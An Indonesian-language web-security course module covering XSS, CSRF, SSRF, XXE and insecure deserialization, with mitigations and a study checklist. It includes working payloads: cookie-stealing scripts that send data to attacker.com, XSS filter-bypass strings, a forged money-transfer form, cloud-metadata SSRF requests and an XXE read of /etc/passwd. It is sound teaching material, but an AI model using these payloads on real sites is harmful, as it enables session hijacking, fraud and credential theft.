# 🕸️ P11 — WEB APPLICATION HACKING: OWASP TOP 10 (BAGIAN 2)

> *"XSS is everywhere. If you can't find it, you're not looking hard enough."*

---

## 1. CROSS-SITE SCRIPTING (XSS)

XSS memungkinkan attacker **menyisipkan JavaScript** ke halaman web yang dilihat user lain.

### 1.1 Reflected XSS

Script disisipkan via URL/parameter, **tidak tersimpan** di server. Korban harus mengklik link berbahaya.

```
# URL normal:
https://target.com/search?q=laptop

# URL dengan XSS:
https://target.com/search?q=<script>alert('XSS')</script>

# Server merender:
<p>Hasil pencarian untuk: <script>alert('XSS')</script></p>
# → Browser menjalankan script!

# Payload mencuri cookie:
https://target.com/search?q=<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>
```

### 1.2 Stored XSS (Lebih Berbahaya!)

Script **tersimpan di database** server. Semua user yang mengunjungi halaman terinfeksi.

```
# Attacker posting komentar di forum:
Komentar: "Artikel bagus! <script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>"

# Komentar disimpan di database
# Setiap user yang membuka halaman → script dijalankan → cookie dicuri!
```

### 1.3 DOM-Based XSS

Script dieksekusi di **client-side** melalui manipulasi DOM, tanpa melalui server.

```javascript
// Kode vulnerable:
var search = document.location.hash.substring(1);
document.getElementById("result").innerHTML = search;

// URL attack:
https://target.com/page#<img src=x onerror=alert('XSS')>
// → Browser merender img tag → onerror trigger → XSS!
```

### 1.4 XSS Bypass Techniques

```html
<!-- Filter bypass jika <script> diblokir -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>

<!-- Case bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Encoding bypass -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### 1.5 Pencegahan XSS

```
1. Output Encoding — escape HTML entities
   < → &lt;   > → &gt;   " → &quot;   ' → &#39;

2. Content Security Policy (CSP) header:
   Content-Security-Policy: script-src 'self'

3. HttpOnly cookie flag (mencegah JavaScript akses cookie):
   Set-Cookie: session=abc; HttpOnly

4. Input validation & sanitization
5. Gunakan framework yang auto-escape (React, Angular)
```

---

## 2. CSRF (Cross-Site Request Forgery)

Memaksa user yang sudah login **melakukan aksi tanpa sadar** melalui halaman berbahaya.

```html
<!-- Attacker membuat halaman ini: evil.com/trap.html -->
<!-- Korban yang sudah login di bank.com mengunjungi halaman ini -->

<!-- Metode 1: Hidden form auto-submit -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Browser korban mengirim request ke bank.com DENGAN cookie session korban! -->
<!-- → Transfer uang ke attacker tanpa sepengetahuan korban -->
```

### Pencegahan CSRF

```
1. CSRF Token — random token per form/request
   <input type="hidden" name="csrf_token" value="random_unique_token">

2. SameSite Cookie:
   Set-Cookie: session=abc; SameSite=Strict

3. Verifikasi Origin/Referer header
4. Re-authentication untuk aksi sensitif
```

---

## 3. SSRF (Server-Side Request Forgery)

Membuat **server** melakukan request ke resource internal yang seharusnya tidak bisa diakses dari luar.

```
# Fitur normal: "Preview URL"
POST /api/preview
{"url": "https://example.com"}     ← Server fetch halaman ini

# SSRF Attack:
POST /api/preview
{"url": "http://localhost:8080/admin"}     ← Akses admin panel internal!
{"url": "http://169.254.169.254/latest/meta-data/"}  ← AWS metadata (credentials!)
{"url": "file:///etc/passwd"}              ← Baca file lokal!
{"url": "http://10.0.0.5:3306/"}          ← Scan port internal
```

### Cloud Metadata SSRF (sangat berbahaya di cloud!)

```
# AWS Instance Metadata:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# → Mendapatkan AWS Access Key & Secret Key!

# GCP:
http://metadata.google.internal/computeMetadata/v1/

# Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 4. XXE (XML External Entity)

Mengeksploitasi parser XML yang memproses **external entities**.

```xml
<!-- Normal XML -->
<?xml version="1.0"?>
<user><name>admin</name></user>

<!-- XXE Attack — Baca file sistem -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
<!-- Server membaca /etc/passwd dan memasukkannya ke response! -->

<!-- XXE → SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<user><name>&xxe;</name></user>
```

### Pencegahan XXE

```
1. Disable DTD processing & external entities di XML parser
2. Gunakan JSON instead of XML jika memungkinkan
3. Whitelist input
4. WAF rules
```

---

## 5. INSECURE DESERIALIZATION

Deserialization mengubah data serial (JSON, binary) kembali menjadi object. Jika input tidak divalidasi → **Remote Code Execution**.

```python
# Python pickle (VULNERABLE!)
import pickle
data = pickle.loads(user_input)  # JANGAN! User bisa inject kode arbitrary

# Java deserialization
# Library seperti Apache Commons Collections memungkinkan RCE
# via gadget chains
```

### Pencegahan
- Jangan deserialize data dari sumber tidak terpercaya
- Gunakan format sederhana (JSON) bukan format binary complex
- Validasi dan sanitize sebelum deserialization
- Monitoring: alert jika deserialization error berulang

---

## 6. CHECKLIST PEMAHAMAN P11

- [ ] Jelaskan 3 tipe XSS (Reflected, Stored, DOM)
- [ ] Tulis payload XSS yang mencuri cookie
- [ ] Apa itu CSRF dan bagaimana pencegahannya?
- [ ] Jelaskan SSRF dan bahayanya di cloud environment
- [ ] Apa itu XXE? Tulis payload XXE untuk membaca /etc/passwd
- [ ] Bagaimana CSP header mencegah XSS?
- [ ] Apa itu SameSite cookie?
- [ ] Selesaikan XSS & CSRF challenge di DVWA/HackTheBox
- [ ] Apa itu Insecure Deserialization?
- [ ] Sebutkan 5 teknik bypass XSS filter

---

*Selanjutnya: [P12 — Privilege Escalation & Post-Exploitation](./P12-Privilege-Escalation.md)*
